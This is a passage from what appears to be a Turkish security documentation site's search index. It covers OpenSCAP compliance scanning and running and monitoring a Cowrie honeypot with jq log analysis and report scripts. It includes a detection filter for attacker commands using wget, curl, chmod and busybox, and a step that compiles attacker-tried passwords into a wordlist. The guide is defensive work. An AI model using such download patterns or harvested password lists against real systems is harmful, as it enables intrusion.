gerekecek (bu da size zaman kazand\u0131r\u0131r).</p>"},{"location":"security/compilers/#4-geri-alma-rollback","title":"4. Geri Alma (Rollback) \ud83d\udd04","text":"<p>E\u011fer bu k\u0131s\u0131tlamalar bir soruna yol a\u00e7arsa, \u015fu komutlarla her \u015feyi eski haline getirebilirsiniz:</p> <pre><code># Kritik ara\u00e7lar\u0131n izinlerini d\u00fczelt (755 herkese a\u00e7\u0131k)\nsudo chmod 755 /usr/bin/gcc* /usr/bin/g++* /usr/bin/make* /usr/bin/cc* /usr/bin/as* /usr/bin/ld*\n\n# Sahipli\u011fi root grubuna geri ver\nsudo chgrp root /usr/bin/gcc* /usr/bin/g++* /usr/bin/make* /usr/bin/cc* /usr/bin/as* /usr/bin/ld*\n</code></pre>"},{"location":"security/compliance/","title":"Uyumluluk ve Standartlar (OpenSCAP)","text":"<p>Sunucu g\u00fcvenli\u011finde bir \u00fcst seviye, Uyumluluk (Compliance) standartlar\u0131n\u0131 kar\u015f\u0131lamakt\u0131r.</p> <p>E\u011fer bankac\u0131l\u0131k, sa\u011fl\u0131k veya e-ticaret (PCI-DSS) sistemleri kuruyorsan\u0131z, Lynis yetmez. Denet\u00e7iler sizden uluslararas\u0131 standartlara (NIST, STIG, CIS) uygunluk raporu isterler. \u0130\u015fte burada OpenSCAP devreye girer.</p>"},{"location":"security/compliance/#1-lynis-vs-openscap","title":"1. Lynis vs OpenSCAP","text":"<p>Bu iki ara\u00e7 rakip de\u011fil, tamamlay\u0131c\u0131d\u0131r.</p> \u00d6zellik Lynis OpenSCAP Ama\u00e7 Genel Sa\u011fl\u0131k Kontrol\u00fc Standartlara Uyumluluk (Compliance) Hedef Kitle Sistem Y\u00f6neticileri, DevOps Denet\u00e7iler (Auditors), Security Ops Standartlar Genel Linux Best-Practice NIST, PCI-DSS, STIG, CIS, HIPAA \u00c7\u0131kt\u0131 \u00d6neri Listesi Puanl\u0131 Resmi Rapor (HTML/XML) Kullan\u0131m Kolay, H\u0131zl\u0131 Detayl\u0131, Yap\u0131land\u0131rma Gerektirir"},{"location":"security/compliance/#2-kurulum-ubuntudebian","title":"2. Kurulum (Ubuntu/Debian)","text":"<p>Ubuntu \u00fczerinde OpenSCAP ara\u00e7lar\u0131 ve g\u00fcvenlik profilleri (<code>ssg-deb</code>) paketlerini kuraca\u011f\u0131z.</p> <pre><code>sudo apt update\nsudo apt install libopenscap8 ssg-base ssg-deb ssg-applications ssg-gtK -y\n</code></pre> <p>[!TIP] &gt; Ubuntu Pro kullan\u0131yorsan\u0131z <code>ubuntu-security-guide</code> (USG) arac\u0131n\u0131 kullanmak \u00e7ok daha kolayd\u0131r. Ancak standart s\u00fcr\u00fcmlerde <code>oscap</code> (OpenSCAP) komutunu kullanaca\u011f\u0131z.</p>"},{"location":"security/compliance/#3-guvenlik-profillerini-kesfetme","title":"3. G\u00fcvenlik Profillerini Ke\u015ffetme","text":"<p>OpenSCAP, sisteminizi belirli bir \"Profil\"e g\u00f6re tarar. \u00d6nce sisteminiz i\u00e7in uygun profilleri listeleyin:</p> <pre><code># Ubuntu 22.04 i\u00e7in profil dosyas\u0131n\u0131 bul\noscap info /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml\n</code></pre> <p>Yayg\u0131n Profiller:</p> <ul> <li>xccdf_..._profile_cis_level1_server: CIS Level 1 (Temel G\u00fcvenlik - \u00d6nerilen)</li> <li>xccdf_..._profile_cis_level2_server: CIS Level 2 (\u00c7ok S\u0131k\u0131 - \u00d6zellikleri bozabilir)</li> <li>xccdf_..._profile_pci_dss: Kredi Kart\u0131 \u00f6deme sistemleri uyumlulu\u011fu</li> </ul>"},{"location":"security/compliance/#4-tarama-baslatma","title":"4. Tarama Ba\u015flatma","text":"<p>A\u015fa\u011f\u0131daki komut, sisteminizi CIS Level 1 standartlar\u0131na g\u00f6re tarar ve size \u015f\u0131k bir HTML raporu olu\u015fturur.</p> <pre><code># CIS Level 1 Taramas\u0131\nsudo oscap xccdf eval \\\n --profile xccdf_org.ssgproject.content_profile_cis_level1_server \\\n --results-arf /tmp/results.xml \\\n --report /tmp/report.html \\\n /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml\n</code></pre> <p>(Not: <code>ssg-ubuntu2204-ds.xml</code> dosya yolu Ubuntu s\u00fcr\u00fcm\u00fcne g\u00f6re de\u011fi\u015febilir. <code>/usr/share/xml/scap/ssg/content/</code> alt\u0131na bak\u0131n.)</p>"},{"location":"security/compliance/#5-raporu-analiz-etme","title":"5. Raporu Analiz Etme","text":"<p>Olu\u015fan <code>/tmp/report.html</code> dosyas\u0131n\u0131 kendi bilgisayar\u0131n\u0131za indirin ve taray\u0131c\u0131da a\u00e7\u0131n.</p> <pre><code># Kendi bilgisayar\u0131n\u0131zdan\nscp root@sunucu-ip:/tmp/report.html ./Masaustu/\n</code></pre> <p>Raporda her ba\u015far\u0131s\u0131z (Fail) test i\u00e7in:</p> <ol> <li>Rule ID: Hangi kural\u0131n ihlal edildi\u011fi.</li> <li>Severity: Ciddiyet seviyesi.</li> <li>Remediation: Nas\u0131l d\u00fczeltilece\u011fi (Bazen haz\u0131r bash/ansible scripti bile verir).</li> </ol> <p>[!WARNING] OpenSCAP remediasyon scriptlerini k\u00f6r\u00fc k\u00f6r\u00fcne \u00e7al\u0131\u015ft\u0131rmay\u0131n! Baz\u0131 kurallar (\u00f6rn: <code>/tmp</code> noexec yapma) \u00e7al\u0131\u015fan uygulamalar\u0131n\u0131z\u0131 bozabilir. \u00d6nce test ortam\u0131nda deneyin.</p>"},{"location":"security/cowrie-analysis/","title":"\ud83c\udf6f Cowrie Honeypot - Tam Rehber","text":"<p>Bu rehber, Cowrie Honeypot'unuzu kurduktan sonra nas\u0131l y\u00f6netece\u011finizi, izleyece\u011finizi ve raporlayaca\u011f\u0131n\u0131z\u0131 anlat\u0131r.</p> <p>Bu rehber, Cowrie Honeypot'unuzu kurduktan sonra nas\u0131l y\u00f6netece\u011finizi, izleyece\u011finizi ve raporlayaca\u011f\u0131n\u0131z\u0131 anlat\u0131r.</p>"},{"location":"security/cowrie-analysis/#dizin-yaps-onerilen","title":"\ud83d\udccd Dizin Yap\u0131s\u0131 (\u00d6nerilen)","text":"<p>Production ortam\u0131 i\u00e7in <code>/mnt/block/cowrie/</code> dizinini kullan\u0131yoruz.</p> <pre><code>/mnt/block/cowrie/\n\u251c\u2500\u2500 docker-compose.yml       # Container ayarlar\u0131\n\u251c\u2500\u2500 etc/\n\u2502   \u2514\u2500\u2500 cowrie.cfg           # Cowrie config\n\u251c\u2500\u2500 var/\n\u2502   \u251c\u2500\u2500 log/cowrie/\n\u2502   \u2502   \u2514\u2500\u2500 cowrie.json      # ANA LOG DOSYASI\n\u2502   \u2514\u2500\u2500 lib/cowrie/\n\u2502       \u251c\u2500\u2500 downloads/       # \u0130ndirilen malware'ler\n\u2502       \u2514\u2500\u2500 tty/             # Session kay\u0131tlar\u0131 (playback)\n\u251c\u2500\u2500 passwords_collected.txt  # Toplanan \u015fifreler\n\u251c\u2500\u2500 create_report.sh         # HTML Rapor scripti\n\u251c\u2500\u2500 daily_summary.sh         # G\u00fcnl\u00fck \u00d6zet scripti\n\u2514\u2500\u2500 report.html              # HTML rapor \u00e7\u0131kt\u0131s\u0131\n</code></pre>"},{"location":"security/cowrie-analysis/#1-sistem-durumu-ve-yonetim","title":"1. Sistem Durumu ve Y\u00f6netim","text":""},{"location":"security/cowrie-analysis/#container-kontrol","title":"Container Kontrol","text":"<pre><code># Durum\ndocker ps | grep cowrie\n\n# Detayl\u0131 durum\ndocker inspect cowrie | jq '.[0].State'\n\n# Kaynak kullan\u0131m\u0131 (CPU, RAM)\ndocker stats cowrie --no-stream\n</code></pre>"},{"location":"security/cowrie-analysis/#baslat-durdur-yeniden-baslat","title":"Ba\u015flat / Durdur / Yeniden Ba\u015flat","text":"<pre><code>cd /mnt/block/cowrie\n\n# Ba\u015flat\ndocker compose up -d\n\n# Durdur\ndocker compose down\n\n# Yeniden ba\u015flat\ndocker compose restart\n\n# Loglarla birlikte ba\u015flat (debug i\u00e7in)\ndocker compose up\n</code></pre>"},{"location":"security/cowrie-analysis/#port-durumu","title":"Port Durumu","text":"<pre><code># Honeypot portlar\u0131 a\u00e7\u0131k m\u0131?\nsudo lsof -i :22\nsudo lsof -i :23\n\n# Ger\u00e7ek SSH (bizim eri\u015fimimiz)\nsudo lsof -i :2222\n</code></pre> Port Servis A\u00e7\u0131klama 22 SSH Honeypot Sald\u0131rganlar buraya d\u00fc\u015fer 23 Telnet Honeypot IoT botlar\u0131 buraya gelir 2222 Ger\u00e7ek SSH Bizim g\u00fcvenli eri\u015fimimiz"},{"location":"security/cowrie-analysis/#2-canl-izleme-komutlar","title":"2. Canl\u0131 \u0130zleme Komutlar\u0131","text":""},{"location":"security/cowrie-analysis/#canl-tum-olaylar","title":"\ud83d\udd34 Canl\u0131 T\u00fcm Olaylar","text":"<pre><code>tail -f /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq .\n</code></pre>"},{"location":"security/cowrie-analysis/#canl-sadece-onemli-olaylar-onerilen","title":"\ud83d\udfe2 Canl\u0131 - Sadece \u00d6nemli Olaylar (\u00d6nerilen)","text":"<pre><code>tail -f /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r '\n  if .eventid == \"cowrie.login.success\" then\n    \"\ud83d\udfe2 G\u0130R\u0130\u015e: \\(.src_ip) \u2192 \\(.username):\\(.password)\"\n  elif .eventid == \"cowrie.login.failed\" then\n    \"\ud83d\udd34 BA\u015eARISIZ: \\(.src_ip) \u2192 \\(.username):\\(.password // \"KEY\")\"\n  elif .eventid == \"cowrie.command.input\" then\n    \"\u26a1 KOMUT: \\(.src_ip) \u2192 \\(.input)\"\n  elif .eventid == \"cowrie.session.file_download\" then\n    \"\ud83d\udce5 DOWNLOAD: \\(.src_ip) \u2192 \\(.url)\"\n  elif .eventid == \"cowrie.session.closed\" then\n    \"\ud83d\udeaa \u00c7IKI\u015e: \\(.src_ip) (\\(.duration | tostring | split(\".\")[0])sn)\"\n  else\n    empty\n  end\n'\n</code></pre>"},{"location":"security/cowrie-analysis/#watch-ile-dashboard-terminal","title":"\ud83d\udcca Watch ile Dashboard (Terminal)","text":"<p>Her 5 saniyede bir g\u00fcncellenen canl\u0131 izleme ekranlar\u0131:</p> <p>Son Sald\u0131r\u0131lar:</p> <pre><code>watch -n 5 'echo \"=== SON SALDIRILAR ===\" &amp;&amp; cat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \"select(.eventid | test(\\\"login\\\")) | \\\"\\(.timestamp | split(\\\"T\\\")[1] | split(\\\".\\\")[0]) \\(.src_ip) \\(.username):\\(.password // \\\"KEY\\\")\\\"\" | tail -10'\n</code></pre> <p>Son Komutlar:</p> <pre><code>watch -n 5 'echo \"=== SON KOMUTLAR ===\" &amp;&amp; cat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \"select(.eventid == \\\"cowrie.command.input\\\") | \\\"\\(.timestamp | split(\\\"T\\\")[1] | split(\\\".\\\")[0]) | \\(.src_ip) | \\(.input)\\\"\" | tail -15'\n</code></pre> <p>Genel \u0130statistik:</p> <pre><code>watch -n 10 'echo \"=== HONEYPOT \u0130STAT\u0130ST\u0130K ===\" &amp;&amp; \\\necho \"Toplam Ba\u011flant\u0131: $(cat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \".session\" | sort -u | wc -l)\" &amp;&amp; \\\necho \"Benzersiz IP: $(cat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \".src_ip\" | sort -u | wc -l)\" &amp;&amp; \\\necho \"Ba\u015far\u0131l\u0131 Giri\u015f: $(cat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \"select(.eventid==\\\"cowrie.login.success\\\")\" | wc -l)\" &amp;&amp; \\\necho \"\u00c7al\u0131\u015ft\u0131r\u0131lan Komut: $(cat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \"select(.eventid==\\\"cowrie.command.input\\\")\" | wc -l)\"'\n</code></pre>"},{"location":"security/cowrie-analysis/#3-analiz-komutlar","title":"3. Analiz Komutlar\u0131","text":""},{"location":"security/cowrie-analysis/#ip-analizi","title":"IP Analizi","text":"<pre><code># Benzersiz sald\u0131rgan IP'leri\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r '.src_ip' | sort -u\n\n# IP say\u0131s\u0131\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r '.src_ip' | sort -u | wc -l\n\n# En aktif 20 IP\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r '.src_ip' | sort | uniq -c | sort -rn | head -20\n\n# Belirli IP'nin t\u00fcm aktiviteleri\nIP=\"27.47.3.64\"\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r \"select(.src_ip==\\\"$IP\\\")\"\n</code></pre>"},{"location":"security/cowrie-analysis/#sifre-analizi","title":"\u015eifre Analizi","text":"<pre><code># En \u00e7ok denenen 30 \u015fifre\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r 'select(.password != null) | .password' | sort | uniq -c | sort -rn | head -30\n\n# En \u00e7ok denenen kullan\u0131c\u0131 adlar\u0131\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r 'select(.username != null) | .username' | sort | uniq -c | sort -rn | head -20\n\n# \u015eifreleri dosyaya kaydet (S\u00f6zl\u00fck olu\u015ftur)\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r 'select(.password != null) | .password' | sort -u &gt;&gt; /mnt/block/cowrie/passwords_collected.txt\n</code></pre>"},{"location":"security/cowrie-analysis/#komut-analizi","title":"Komut Analizi","text":"<pre><code># En \u00e7ok \u00e7al\u0131\u015ft\u0131r\u0131lan komutlar\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r 'select(.eventid == \"cowrie.command.input\") | .input' | sort | uniq -c | sort -rn | head -20\n\n# Tehlikeli komutlar (wget, curl, chmod)\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r 'select(.eventid == \"cowrie.command.input\") | select(.input | test(\"wget|curl|chmod|busybox\")) | \"\\(.src_ip) | \\(.input)\"'\n</code></pre>"},{"location":"security/cowrie-analysis/#malware-analizi","title":"Malware Analizi","text":"<pre><code># \u0130ndirme denemeleri (URL'ler)\ncat /mnt/block/cowrie/var/log/cowrie/cowrie.json | jq -r 'select(.eventid | test(\"download\")) | \"\\(.src_ip) | \\(.url // .outfile)\"'\n\n# \u0130ndirilen dosyalar\nls -lah /mnt/block/cowrie/var/lib/cowrie/downloads/\n\n# Dosya hash'leri (VirusTotal i\u00e7in)\nsha256sum /mnt/block/cowrie/var/lib/cowrie/downloads/* 2&gt;/dev/null\n</code></pre>"},{"location":"security/cowrie-analysis/#session-oturum-analizi","title":"Session (Oturum) Analizi","text":"<pre><code># TTY kay\u0131tlar\u0131n\u0131 listele\nls -la /mnt/block/cowrie/var/lib/cowrie/tty/\n\n# TTY kayd\u0131n\u0131 oynat (session izle)\n# Dosya ad\u0131n\u0131 de\u011fi\u015ftir\ndocker exec cowrie python3 /cowrie/cowrie-git/bin/playlog /cowrie/cowrie-git/var/lib/cowrie/tty/DOSYA_ADI.log\n</code></pre>"},{"location":"security/cowrie-analysis/#4-log-yonetimi-ve-temizlik","title":"4. Log Y\u00f6netimi ve Temizlik","text":"<p>Honeypot loglar\u0131 \u00e7ok h\u0131zl\u0131 b\u00fcy\u00fcr. D\u00fczenli temizlik \u015fartt\u0131r.</p>"},{"location":"security/cowrie-analysis/#log-boyutunu-kontrol","title":"Log Boyutunu Kontrol","text":"<pre><code>du -sh /mnt/block/cowrie/var/\n</code></pre>"},{"location":"security/cowrie-analysis/#otomatik-log-rotation-cron","title":"Otomatik Log Rotation (Cron)","text":"<p>Her gece 03:00'te loglar\u0131 yedekleyip temizleyen script.</p> <ol> <li>Scripti olu\u015ftur: <code>nano /mnt/block/cowrie/log_rotate.sh</code></li> </ol> <pre><code>#!/bin/bash\nDATE=$(date +%Y%m%d)\nBACKUP_DIR=\"/mnt/block/cowrie/backups\"\nLOG_FILE=\"/mnt/block/cowrie/var/log/cowrie/cowrie.json\"\n\nmkdir -p $BACKUP_DIR\n\n# Yedekle ve s\u0131k\u0131\u015ft\u0131r\ncp $LOG_FILE ${BACKUP_DIR}/cowrie_${DATE}.json\ngzip ${BACKUP_DIR}/cowrie_${DATE}.json\n\n# TTY (Oturum kay\u0131tlar\u0131) yedekle\ntar -czf ${BACKUP_DIR}/tty_${DATE}.tar.gz /mnt/block/cowrie/var/lib/cowrie/tty/ 2&gt;/dev/null\n\n# Log dosyas\u0131n\u0131 s\u0131f\u0131rla\n&gt; $LOG_FILE\n\n# Container'\u0131 yeniden ba\u015flat (Temiz ba\u015flang\u0131\u00e7)\ncd /mnt/block/cowrie &amp;&amp; docker compose restart\n\n# 30 g\u00fcnden eski yedekleri sil\nfind $BACKUP_DIR -type f -mtime +30 -delete\n\necho \"$(date): Log rotation tamamland\u0131\" &gt;&gt; /mnt/block/cowrie/rotation.log\n</code></pre> <ol> <li>\u00c7al\u0131\u015ft\u0131r\u0131labilir yap: <code>chmod +x /mnt/block/cowrie/log_rotate.sh</code></li> <li>Cron'a ekle: <code>crontab -e</code> -&gt; <code>0 3 * * * /mnt/block/cowrie/log_rotate.sh</code></li> </ol>"},{"location":"security/cowrie-analysis/#5-otomatik-raporlama","title":"5. Otomatik Raporlama","text":""},{"location":"security/cowrie-analysis/#a-gunluk-ozet-script-terminal","title":"A. G\u00fcnl\u00fck \u00d6zet Script (Terminal)","text":"<p>H\u0131zl\u0131ca \"Bug\u00fcn ne oldu?\" g\u00f6rmek i\u00e7in.</p> <ol> <li>Script: <code>nano /mnt/block/cowrie/daily_summary.sh</code></li> </ol> <pre><code>#!/bin/bash\nLOG=\"/mnt/block/cowrie/var/log/cowrie/cowrie.json\"\n\necho \"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\"\necho \"\u2551       \ud83c\udf6f COWRIE G\u00dcNL\u00dcK RAPOR                   \u2551\"\necho \"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\"\necho \"\ud83d\udcc5 Tarih: $(date)\"\necho \"\"\necho \"\ud83d\udcca GENEL \u0130STAT\u0130ST\u0130KLER\"\necho \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\"\necho \"   Toplam Ba\u011flant\u0131    : $(cat $LOG | jq -r '.session' | sort -u | wc -l)\"\necho \"   Benzersiz IP       : $(cat $LOG | jq -r '.src_ip' | sort -u | wc -l)\"\necho \"   Ba\u015far\u0131l\u0131 Giri\u015f     : $(cat $LOG | jq 'select(.eventid==\"cowrie.login.success\")' | wc -l)\"\necho \"   Ba\u015far\u0131s\u0131z Giri\u015f    : $(cat $LOG | jq 'select(.eventid==\"cowrie.login.failed\")' | wc -l)\"\necho \"   \u00c7al\u0131\u015ft\u0131r\u0131lan Komut : $(cat $LOG | jq 'select(.eventid==\"cowrie.command.input\")' | wc -l)\"\necho \"\"\necho \"\ud83c\udf0d EN AKT\u0130F 5 SALDIRGAN\"\necho \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\"\ncat $LOG | jq -r '.src_ip' | sort | uniq -c | sort -rn | head -5 | awk '{printf \"   %-20s : %s deneme\\n\", $2, $1}'\necho \"\"\necho \"\ud83d\udd11 EN \u00c7OK DENENEN 5 \u015e\u0130FRE\"\necho \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\"\ncat $LOG | jq -r 'select(.password != null) | .password' | sort | uniq -c | sort -rn | head -5 | awk '{printf \"   %-20s : %s kez\\n\", $2, $1}'\necho \"\"\necho \"\ud83d\udcbb SON 5 KOMUT\"\necho \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\"\ncat $LOG | jq -r 'select(.eventid == \"cowrie.command.input\") | \"   \\(.src_ip): \\(.input)\"' | tail -5\necho \"\"\necho \"\ud83d\udce5 \u0130ND\u0130R\u0130LEN MALWARE\"\necho \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\"\nls /mnt/block/cowrie/var/lib/cowrie/downloads/ 2&gt;/dev/null | head -5 || echo \"   Hen\u00fcz yok\"\necho \"\"\necho \"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\"\n</code></pre> <ol> <li>\u00c7al\u0131\u015ft\u0131r\u0131labilir yap: <code>chmod +x /mnt/block/cowrie/daily_summary.sh</code></li> </ol>"},{"location":"security/cowrie-analysis/#b-html-dashboard-raporu-gorsel","title":"B. HTML Dashboard Raporu (G\u00f6rsel) \u2728","text":"<p>\u015e\u0131k, karanl\u0131k modlu bir HTML raporu olu\u015fturur.</p> <ol> <li>Script: <code>nano /mnt/block/cowrie/create_report.sh</code></li> </ol> <pre><code>#!/bin/bash\nLOG_FILE=\"/mnt/block/cowrie/var/log/cowrie/cowrie.json\"\nOUTPUT_FILE=\"/mnt/block/cowrie/report.html\"\n\ncat &lt;&lt;EOF &gt; $OUTPUT_FILE\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"tr\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta http-equiv=\"refresh\" content=\"60\"&gt;\n    &lt;title&gt;\ud83c\udf6f Honeypot Dashboard&lt;/title&gt;\n    &lt;style&gt;\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: 'Segoe UI', Tahoma, sans-serif;\n            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);\n            color: #eee;\n            padding: 20px;\n            min-height: 100vh;\n        }\n        h1 {\n            text-align: center;\n            color: #00d9ff;\n            margin-bottom: 10px;\n            text-shadow: 0 0 20px rgba(0,217,255,0.5);\n        }\n        .timestamp { text-align: center; color: #888; margin-bottom: 30px; }\n        .grid {\n            display: grid;\n            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));\n            gap: 20px;\n            max-width: 1400px;\n            margin: 0 auto;\n        }\n        .card {\n            background: rgba(255,255,255,0.05);\n            backdrop-filter: blur(10px);\n            padding: 20px;\n            border-radius: 15px;\n            border: 1px solid rgba(255,255,255,0.1);\n            box-shadow: 0 8px 32px rgba(0,0,0,0.3);\n        }\n        .card h2 {\n            color: #00d9ff;\n            margin-bottom: 15px;\n            font-size: 1.1em;\n            display: flex;\n            align-items: center;\n            gap: 10px;\n        }\n        .metric {\n            font-size: 3em;\n            font-weight: bold;\n            color: #00ff88;\n            text-shadow: 0 0 30px rgba(0,255,136,0.5);\n        }\n        .metric-row {\n            display: flex;\n            justify-content: space-around;\n            text-align: center;\n        }\n        .metric-item { flex: 1; }\n        .metric-label { color: #888; font-size: 0.9em; margin-top: 5px; }\n        table { width: 100%; border-collapse: collapse; margin-top: 10px; }\n        th {\n            background: rgba(0,217,255,0.2);\n            color: #00d9ff;\n            padding: 12px;\n            text-align: left;\n            font-weight: 600;\n        }\n        td {\n            padding: 10px 12px;\n            border-bottom: 1px solid rgba(255,255,255,0.05);\n        }\n        tr:hover { background: rgba(255,255,255,0.05); }\n        .danger { color: #ff6b6b; }\n        .success { color: #00ff88; }\n        .command {\n            font-family: 'Fira Code', 'Consolas', monospace;\n            color: #ffd93d;\n            font-size: 0.85em;\n            word-break: break-all;\n        }\n        .ip { color: #74b9ff; }\n        .count {\n            background: rgba(0,217,255,0.2);\n            padding: 4px 8px;\n            border-radius: 12px;\n            font-size: 0.85em;\n        }\n        .full-width { grid-column: 1 / -1; }\n        pre {\n            background: rgba(0,0,0,0.3);\n            padding: 15px;\n            border-radius: 8px;\n            overflow-x: auto;\n            font-size: 0.85em;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;\ud83c\udf6f Honeypot \u0130stihbarat Merkezi&lt;/h1&gt;\n    &lt;p class=\"timestamp\"&gt;Son G\u00fcncelleme: $(date '+%Y-%m-%d %H:%M:%S') | Sayfa 60 saniyede yenilenir&lt;/p&gt;\n\n    &lt;div class=\"grid\"&gt;\n        &lt;div class=\"card\"&gt;\n            &lt;h2&gt;\ud83d\udcca Genel Bak\u0131\u015f&lt;/h2&gt;\n            &lt;div class=\"metric-row\"&gt;\n                &lt;div class=\"metric-item\"&gt;\n                    &lt;div class=\"metric\"&gt;$(cat $LOG_FILE | jq -r '.session' | sort -u | wc -l)&lt;/div&gt;\n                    &lt;div class=\"metric-label\"&gt;Toplam Ba\u011flant\u0131&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;div class=\"metric-item\"&gt;\n                    &lt;div class=\"metric\"&gt;$(cat $LOG_FILE | jq -r '.src_ip' | sort -u | wc -l)&lt;/div&gt;\n                    &lt;div class=\"metric-label\"&gt;Benzersiz IP&lt;/div&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"card\"&gt;\n            &lt;h2&gt;\ud83d\udd10 Giri\u015f \u0130statistikleri&lt;/h2&gt;\n            &lt;div class=\"metric-row\"&gt;\n                &lt;div class=\"metric-item\"&gt;\n                    &lt;div class=\"metric success\"&gt;$(cat $LOG_FILE | jq 'select(.eventid==\"cowrie.login.success\")' | wc -l)&lt;/div&gt;\n                    &lt;div class=\"metric-label\"&gt;Ba\u015far\u0131l\u0131&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;div class=\"metric-item\"&gt;\n                    &lt;div class=\"metric danger\"&gt;$(cat $LOG_FILE | jq 'select(.eventid==\"cowrie.login.failed\")' | wc -l)&lt;/div&gt;\n                    &lt;div class=\"metric-label\"&gt;Ba\u015far\u0131s\u0131z&lt;/div&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"card\"&gt;\n            &lt;h2&gt;\ud83c\udf0d En Aktif Sald\u0131rganlar&lt;/h2&gt;\n            &lt;table&gt;\n                &lt;tr&gt;&lt;th&gt;IP Adresi&lt;/th&gt;&lt;th&gt;Deneme&lt;/th&gt;&lt;/tr&gt;\n                $(cat $LOG_FILE | jq -r '.src_ip' | sort | uniq -c | sort -rn | head -10 | awk '{print \"&lt;tr&gt;&lt;td class=\\\"ip\\\"&gt;\"$2\"&lt;/td&gt;&lt;td&gt;&lt;span class=\\\"count\\\"&gt;\"$1\"&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;\"}')\n            &lt;/table&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"card\"&gt;\n            &lt;h2&gt;\ud83d\udd11 En \u00c7ok Denenen \u015eifreler&lt;/h2&gt;\n            &lt;table&gt;\n                &lt;tr&gt;&lt;th&gt;\u015eifre&lt;/th&gt;&lt;th&gt;Deneme&lt;/th&gt;&lt;/tr&gt;\n                $(cat $LOG_FILE | jq -r 'select(.password != null) | .password' | sort | uniq -c | sort -rn | head -10 | awk '{print \"&lt;tr&gt;&lt;td class=\\\"danger\\\"&gt;\"$2\"&lt;/td&gt;&lt;td&gt;&lt;span 